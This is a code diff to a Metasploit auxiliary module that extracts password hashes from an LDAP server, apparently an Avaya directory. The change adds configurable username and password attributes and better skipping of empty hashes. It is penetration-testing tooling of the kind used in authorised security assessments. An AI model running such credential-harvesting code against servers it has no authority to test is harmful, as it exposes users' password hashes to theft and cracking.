@@ -44,7 +44,8 @@ class MetasploitModule < Msf::Auxiliary
     register_options([
       Opt::RPORT(636), # SSL/TLS
       OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
-      OptString.new('ATTRIBUTE', [true, 'LDAP attribute, that contains password hashes', 'userPassword'])
+      OptString.new('USER_ATTR', [false, 'LDAP attribute, that contains username', 'dn']),
+      OptString.new('PASS_ATTR', [true, 'LDAP attribute, that contains password hashes', 'userPassword'])
     ])
   end
 
@@ -52,8 +53,12 @@ class MetasploitModule < Msf::Auxiliary
     @base_dn ||= 'dc=vsp'
   end
 
-  def attribute
-    @attribute ||= 'userPassword'
+  def pass_attr
+    @pass_attr ||= 'userPassword'
+  end
+
+  def user_attr
+    @user_attr ||= 'dn'
   end
 
   # PoC using ldapsearch(1):
@@ -82,7 +87,7 @@ class MetasploitModule < Msf::Auxiliary
       entries = ldap.search(base: base_dn)
     end
 
-    # Look for an entry with a non-empty userPassword  attribute
+    # We are ok with any entry returned
     unless entries.any?
       print_error("#{peer} LDAP server did not return any entries")
       return Exploit::CheckCode::Safe
@@ -119,13 +124,13 @@ class MetasploitModule < Msf::Auxiliary
 
     print_good("Saved LDAP data to #{ldif_filename}")
 
-    unless @attribute
-      @attribute = datastore["ATTRIBUTE"]
+    unless @pass_attr
+      @pass_attr = datastore["PASS_ATTR"]
     end
 
-    print_status("Searching for attribute: #{@attribute}")
+    print_status("Searching for attribute: #{@pass_attr}")
     # Process entries with a non-empty userPassword attribute
-    process_hashes(entries.select { |entry| entry[@attribute].any? })
+    process_hashes(entries.select { |entry| entry[@pass_attr].any? })
   end
 
   def process_hashes(entries)
@@ -144,13 +149,25 @@ class MetasploitModule < Msf::Auxiliary
       service_name: 'avaya/ldap'
     }
 
+    unless @user_attr
+      @user_attr = datastore["USER_ATTR"]
+    end
+
+    unless @user_attr
+      @user_attr = "dn"
+    end
+
+    print_status("Taking #{@user_attr} attribute as username")
+
     entries.each do |entry|
       # This is the "username"
-      dn = entry.dn
+      dn = entry[@user_attr].first #.dn
 
-      hash = entry[@attribute].first
-      if hash.downcase.start_with?("{crypt}") && hash.length < 10
-        # Skip empty hashes '{CRYPT}x'
+      hash = entry[@pass_attr].first
+
+      # Skip empty hashes '{CRYPT}x'
+      if hash.nil? || hash.empty? ||
+          (hash.downcase.start_with?("{crypt}") && hash.length < 10)
         next
       end
 
